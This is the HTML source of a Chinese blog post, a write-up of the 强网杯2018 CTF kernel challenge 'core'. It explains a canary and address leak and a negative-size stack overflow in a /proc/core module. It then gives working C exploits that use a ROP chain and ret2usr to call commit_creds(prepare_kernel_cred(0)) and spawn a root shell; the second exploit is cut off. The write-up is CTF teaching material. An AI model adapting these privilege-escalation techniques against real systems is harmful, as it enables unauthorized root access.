@@ -1,0 +1,330 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="做出的第二道kernel pwn，依然感谢很多大佬的帮助。 程序共有四个功能，三个通过ioctl触发，一个通过wirte触发。  这个函数提供了copy to user的功能，而copy时的off是我们可以控制的，而且这题开了canary，因此我们可以通过这个洞来leak canary，以及leak出程序地址动态计算gadget的地址。  这个函数能够向name写数据。  这个函数从name me">
+<meta property="og:type" content="article">
+<meta property="og:title" content="强网杯2018 core writeup">
+<meta property="og:url" content="https://veritas501.github.io/2018_06_05-%E5%BC%BA%E7%BD%91%E6%9D%AF2018_core_writeup/index.html">
+<meta property="og:site_name" content="veritas501&#39;s blog">
+<meta property="og:description" content="做出的第二道kernel pwn，依然感谢很多大佬的帮助。 程序共有四个功能，三个通过ioctl触发，一个通过wirte触发。  这个函数提供了copy to user的功能，而copy时的off是我们可以控制的，而且这题开了canary，因此我们可以通过这个洞来leak canary，以及leak出程序地址动态计算gadget的地址。  这个函数能够向name写数据。  这个函数从name me">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://veritas501.github.io/2018_06_05-%E5%BC%BA%E7%BD%91%E6%9D%AF2018_core_writeup/kernel_7dbdaea6945f70d9ff312f226f4bd0a7.png">
+<meta property="og:image" content="https://veritas501.github.io/2018_06_05-%E5%BC%BA%E7%BD%91%E6%9D%AF2018_core_writeup/kernel_38c9a63496ab22b20ec9be3b00840397.png">
+<meta property="og:image" content="https://veritas501.github.io/2018_06_05-%E5%BC%BA%E7%BD%91%E6%9D%AF2018_core_writeup/kernel_edc39c31f889906cfb92e8b8e5d967e0.png">
+<meta property="og:image" content="https://veritas501.github.io/2018_06_05-%E5%BC%BA%E7%BD%91%E6%9D%AF2018_core_writeup/kernel_73a8e3b3a78c16ea7ddb803e75feadde.png">
+<meta property="og:image" content="https://veritas501.github.io/2018_06_05-%E5%BC%BA%E7%BD%91%E6%9D%AF2018_core_writeup/kernel_86baf0ecc0690bdc0857f463bbe51978.png">
+<meta property="article:published_time" content="2018-06-04T16:00:00.000Z">
+<meta property="article:modified_time" content="2023-12-08T03:09:28.426Z">
+<meta property="article:author" content="veritas501">
+<meta property="article:tag" content="kernel">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://veritas501.github.io/2018_06_05-%E5%BC%BA%E7%BD%91%E6%9D%AF2018_core_writeup/kernel_7dbdaea6945f70d9ff312f226f4bd0a7.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>强网杯2018 core writeup</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+		<script type="text/x-mathjax-config">
+		  MathJax.Hub.Config({
+			tex2jax: {
+			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+			  inlineMath: [['$','$']]
+			}
+		  });
+		</script>
+		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/veritas501">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2022_03_16-CVE_2022_0185%E5%88%86%E6%9E%90%E5%8F%8A%E5%88%A9%E7%94%A8%E4%B8%8Epipe%E6%96%B0%E5%8E%9F%E8%AF%AD%E6%80%9D%E8%80%83%E4%B8%8E%E5%AE%9E%E8%B7%B5/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2018_06_04-0CTF_final_baby_kernel/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://veritas501.github.io/2018_06_05-%E5%BC%BA%E7%BD%91%E6%9D%AF2018_core_writeup/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://veritas501.github.io/2018_06_05-%E5%BC%BA%E7%BD%91%E6%9D%AF2018_core_writeup/&text=强网杯2018 core writeup"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://veritas501.github.io/2018_06_05-%E5%BC%BA%E7%BD%91%E6%9D%AF2018_core_writeup/&title=强网杯2018 core writeup"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://veritas501.github.io/2018_06_05-%E5%BC%BA%E7%BD%91%E6%9D%AF2018_core_writeup/&is_video=false&description=强网杯2018 core writeup"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=强网杯2018 core writeup&body=Check out this article: https://veritas501.github.io/2018_06_05-%E5%BC%BA%E7%BD%91%E6%9D%AF2018_core_writeup/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://veritas501.github.io/2018_06_05-%E5%BC%BA%E7%BD%91%E6%9D%AF2018_core_writeup/&title=强网杯2018 core writeup"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://veritas501.github.io/2018_06_05-%E5%BC%BA%E7%BD%91%E6%9D%AF2018_core_writeup/&title=强网杯2018 core writeup"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://veritas501.github.io/2018_06_05-%E5%BC%BA%E7%BD%91%E6%9D%AF2018_core_writeup/&title=强网杯2018 core writeup"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://veritas501.github.io/2018_06_05-%E5%BC%BA%E7%BD%91%E6%9D%AF2018_core_writeup/&title=强网杯2018 core writeup"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://veritas501.github.io/2018_06_05-%E5%BC%BA%E7%BD%91%E6%9D%AF2018_core_writeup/&name=强网杯2018 core writeup&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://veritas501.github.io/2018_06_05-%E5%BC%BA%E7%BD%91%E6%9D%AF2018_core_writeup/&t=强网杯2018 core writeup"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        强网杯2018 core writeup
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">veritas501</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2018-06-04T16:00:00.000Z" class="dt-published" itemprop="datePublished">2018-06-05</time>
+        
+        (Updated: <time datetime="2023-12-08T03:09:28.426Z" class="dt-updated" itemprop="dateModified">2023-12-08</time>)
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/kernel/" rel="tag">kernel</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p>做出的第二道kernel pwn，依然感谢很多大佬的帮助。</p>
+<p>程序共有四个功能，三个通过ioctl触发，一个通过wirte触发。</p>
+<p><img src="/2018_06_05-%E5%BC%BA%E7%BD%91%E6%9D%AF2018_core_writeup/kernel_7dbdaea6945f70d9ff312f226f4bd0a7.png"></p>
+<p>这个函数提供了copy to user的功能，而copy时的off是我们可以控制的，而且这题开了canary，因此我们可以通过这个洞来leak canary，以及leak出程序地址动态计算gadget的地址。</p>
+<p><img src="/2018_06_05-%E5%BC%BA%E7%BD%91%E6%9D%AF2018_core_writeup/kernel_38c9a63496ab22b20ec9be3b00840397.png"></p>
+<p>这个函数能够向name写数据。</p>
+<p><img src="/2018_06_05-%E5%BC%BA%E7%BD%91%E6%9D%AF2018_core_writeup/kernel_edc39c31f889906cfb92e8b8e5d967e0.png"></p>
+<p>这个函数从name memcpy到栈上的数组，而name数组的内容我们可以通过write函数来设置，通过一个负数溢出，我们就能够rop。</p>
+<p><img src="/2018_06_05-%E5%BC%BA%E7%BD%91%E6%9D%AF2018_core_writeup/kernel_73a8e3b3a78c16ea7ddb803e75feadde.png"></p>
+<p>利用思路：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.修改off，通过core_read leak canary和程序地址。</span><br><span class="line">2.通过core_write向name上写rop。</span><br><span class="line">3.通过core_copy_func栈溢出，rop。</span><br><span class="line">4.rop调用commit_creds(prepare_kernel_cred(0))，然后swapgs，iretq到用户态</span><br><span class="line">5.用户态起shell，get root</span><br></pre></td></tr></table></figure>
+
+<p>由于这题没有开smep，因此我们至少有两种做法，一种是直接在kernel空间rop，exp如下</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> user_cs;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> user_ss;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> user_rflags;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">save_state</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="built_in">asm</span>(</span><br><span class="line">	<span class="string">&quot;movq %%cs, %0\n&quot;</span></span><br><span class="line">	<span class="string">&quot;movq %%ss, %1\n&quot;</span></span><br><span class="line">	<span class="string">&quot;pushfq\n&quot;</span></span><br><span class="line">	<span class="string">&quot;popq %2\n&quot;</span></span><br><span class="line">	: <span class="string">&quot;=r&quot;</span> (user_cs), <span class="string">&quot;=r&quot;</span> (user_ss), <span class="string">&quot;=r&quot;</span> (user_rflags) : : <span class="string">&quot;memory&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">shell</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(!<span class="built_in">getuid</span>())</span><br><span class="line">		<span class="built_in">execl</span>(<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;sh&quot;</span>, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span></span>&#123;</span><br><span class="line">	<span class="type">int</span> fd  = <span class="built_in">open</span>(<span class="string">&quot;/proc/core&quot;</span>,O_RDWR);</span><br><span class="line">	<span class="keyword">if</span>(fd&lt;<span class="number">0</span>)&#123;</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">&quot;open core error!&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;&#123;==dbg==&#125; fd: %d\n&quot;</span>,fd);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">save_state</span>();</span><br><span class="line">	<span class="type">void</span> *page = <span class="built_in">mmap</span>(<span class="number">0</span>,<span class="number">0x500000</span>,<span class="number">3</span>,<span class="number">34</span>,<span class="number">-1</span>,<span class="number">0</span>);</span><br><span class="line">	<span class="type">int</span> ret;</span><br><span class="line">	<span class="type">char</span> buf[<span class="number">64</span>];</span><br><span class="line">	<span class="built_in">memset</span>(buf,<span class="number">0</span>,<span class="number">64</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;&#123;==dbg==&#125; set off&quot;</span>);</span><br><span class="line">	ret = <span class="built_in">ioctl</span>(fd,<span class="number">0x6677889C</span>,<span class="number">0x40</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;&#123;==dbg==&#125; ret: %d\n&quot;</span>,ret);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;&#123;==dbg==&#125; copy to user&quot;</span>);</span><br><span class="line">	ret = <span class="built_in">ioctl</span>(fd,<span class="number">0x6677889b</span>,(<span class="type">void</span> *)buf);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;&#123;==dbg==&#125; ret: %d\n&quot;</span>,ret);</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> canary = ((<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> *)buf)[<span class="number">0</span>];</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> leak = ((<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> *)buf)[<span class="number">7</span>];</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> offset = leak<span class="number">-0xffffffff8118ecfa</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;&#123;==dbg==&#125; canary: %p\n&quot;</span>,(<span class="type">void</span> *)canary);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;&#123;==dbg==&#125; leak offset: %p\n&quot;</span>,(<span class="type">void</span>*)offset);</span><br><span class="line"></span><br><span class="line">	<span class="type">char</span> rop_buf[<span class="number">0x1000</span>];</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> * rop = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> *)rop_buf;</span><br><span class="line">	<span class="type">int</span> i=<span class="number">0</span>;</span><br><span class="line">	rop[i++] = <span class="number">0x6161616161616161</span>;</span><br><span class="line">	rop[i++] = <span class="number">0x6161616161616161</span>;</span><br><span class="line">	rop[i++] = <span class="number">0x6161616161616161</span>;</span><br><span class="line">	rop[i++] = <span class="number">0x6161616161616161</span>;</span><br><span class="line">	rop[i++] = <span class="number">0x6161616161616161</span>;</span><br><span class="line">	rop[i++] = <span class="number">0x6161616161616161</span>;</span><br><span class="line">	rop[i++] = <span class="number">0x6161616161616161</span>;</span><br><span class="line">	rop[i++] = <span class="number">0x6161616161616161</span>;</span><br><span class="line">	rop[i++] = canary;</span><br><span class="line">	rop[i++] = <span class="number">0x6161616161616161</span>;<span class="comment">//rbx</span></span><br><span class="line">	<span class="comment">//ret</span></span><br><span class="line">	rop[i++] = <span class="number">0xffffffff81000b2f</span>+offset;<span class="comment">//pop rdi ; ret</span></span><br><span class="line">	rop[i++] = <span class="number">0</span>;</span><br><span class="line">	rop[i++] = <span class="number">0xffffffff8109cce0</span>+offset;<span class="comment">//prepare_kernel_cred</span></span><br><span class="line">	rop[i++] = <span class="number">0xffffffff810a0f49</span>+offset;<span class="comment">//pop rdx ; ret</span></span><br><span class="line">	rop[i++] = <span class="number">0xffffffff8109c8e0</span>+<span class="number">2</span>+offset;<span class="comment">//commit_creds</span></span><br><span class="line">	rop[i++] = <span class="number">0xffffffff8101aa6a</span>+offset;<span class="comment">//mov rdi, rax ; call rdx</span></span><br><span class="line">	rop[i++] = <span class="number">0xffffffff81a012da</span>+offset;<span class="comment">//swapgs ; popfq ; ret</span></span><br><span class="line">	rop[i++] = <span class="number">0xdeadbeef</span>;</span><br><span class="line">	rop[i++] = <span class="number">0xffffffff81050ac2</span>+offset;<span class="comment">//iretq</span></span><br><span class="line">	rop[i++] = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)shell;</span><br><span class="line">	rop[i++] = user_cs;</span><br><span class="line">	rop[i++] = user_rflags;</span><br><span class="line">	rop[i++] = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)(page+<span class="number">0x400000</span>);</span><br><span class="line">	rop[i++] = user_ss;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;&#123;==dbg==&#125; copy from user&quot;</span>);</span><br><span class="line">	<span class="built_in">write</span>(fd,rop_buf,<span class="number">0x800</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;&#123;==dbg==&#125; lets rop&quot;</span>);</span><br><span class="line">	ret = <span class="built_in">ioctl</span>(fd,<span class="number">0x6677889a</span>,<span class="number">0xffffffffffff0000</span>|(<span class="number">0x100</span>));</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;&#123;==dbg==&#125; ret: %d\n&quot;</span>,ret);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>另一种是直接跳到用户空间去执行代码，commit_creds(prepare_kernel_cred(0))，swapgs，iretq，然后起shell。exp如下</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">trap_frame</span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> rip;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> cs;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> eflags;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> rsp;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> ss;</span><br><span class="line">&#125;__attribute__((packed));</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">trap_frame</span> tf;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *page;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">get_shell</span><span class="params">(<span class="type">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="built_in">execl</span>(<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;sh&quot;</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">init_tf_work</span><span class="params">(<span class="type">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="built_in">asm</span>(<span class="string">&quot;mov %cs,%rax;pushq %rax;popq tf+8;&quot;</span> <span class="comment">//set cs</span></span><br><span class="line">        <span class="string">&quot;pushf;popq tf+16;&quot;</span>  <span class="comment">//set eflags</span></span><br><span class="line">        <span class="string">&quot;mov %ss,%rax;pushq %rax;popq tf+32;&quot;</span>);</span><br><span class="line">    tf.rip = &amp;get_shell;</span><br><span class="line">    tf.rsp = page+<span class="number">0x400000</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KERNCALL __attribute__((regparm(3)))</span></span><br><span class="line"><span class="type">void</span>* (*prepare_kernel_cred)(<span class="type">void</span>*) KERNCALL = (<span class="type">void</span>*) <span class="number">0xffffffff8109cce0</span>;</span><br><span class="line"><span class="built_in">void</span> (*commit_creds)(<span class="type">void</span>*) KERNCALL = (<span class="type">void</span>*) <span class="number">0xffffffff8109c8e0</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">payload</span><span class="params">(<span class="type">void</span>)</span></span>&#123;  </span><br><span class="line">    <span class="built_in">commit_creds</span>(<span class="built_in">prepare_kernel_cred</span>(<span class="number">0</span>));</span><br><span class="line">    <span class="built_in">asm</span>(<span class="string">&quot;swapgs;mov $tf,%rsp;iretq;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span></span>&#123;</span><br><span class="line">	<span class="type">int</span> fd  = <span class="built_in">open</span>(<span class="string">&quot;/proc/core&quot;</span>,O_RDWR);</span><br><span class="line">	<span class="keyword">if</span>(fd&lt;<span class="number">0</span>)&#123;</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">&quot;open core error!&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;&#123;==dbg==&#125; fd: %d\n&quot;</span>,fd);</span><br><span class="line"></span><br><span class="line">	page = <span class="built_in">mmap</span>(<span class="number">0x13370000</span>,<span class="number">0x500000</span>,<span class="number">3</span>,<span class="number">34</span>,<span class="number">-1</span>,<span class="number">0</span>);</span><br><span class="line">	<span class="built_in">init_tf_work</span>();</span><br><span class="line">	<span class="type">int</span> ret;</span><br><span class="line">	<span class="type">char</span> buf[<span class="number">64</span>];</span><br><span class="line">	<span class="built_in">memset</span>(buf,<span class="number">0</span>,<span class="number">64</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;&#123;==dbg==&#125; set off&quot;</span>);</span><br><span class="line">	ret = <span class="built_in">ioctl</span>(fd,<span class="number">0x6677889C</span>,<span class="number">0x40</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;&#123;==dbg==&#125; ret: %d\n&quot;</span>,ret);</span><br><span class="line"></span><br><span class="line">	<span 